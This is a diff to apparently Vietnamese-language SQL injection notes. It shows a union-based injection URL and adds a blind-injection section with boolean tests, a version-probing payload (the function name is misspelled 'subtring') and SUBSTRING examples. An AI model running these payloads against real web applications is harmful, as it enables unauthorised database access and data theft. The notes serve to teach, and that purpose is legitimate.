@@ -42,3 +42,17 @@ hoặc thay đoạn lấy table =column
 ```
 http://fakesite.com/report.php?id=-23 union Select 1,2,concat(column1,column2),4,5 from tên bảng-- -
 ```
+
+## Blind SQL Injection
+
+- check : and 1=1 -> and 1=0 
+
+- kiểm tra version :.. and subtring(@@version,1,1)=4 ( trong đó 4 là check version 4.0 /)
+
+```
+1. SUBSTRING(string,vị trí, số lượng): Hàm cắt chuỗi
+vd:
+SUBSTRING('dbo', 1, 1) = ‘d’
+SUBSTRING('dbo', 2, 1) = ‘b’
+SUBSTRING('dbo', 3, 1) = ‘o’
+```
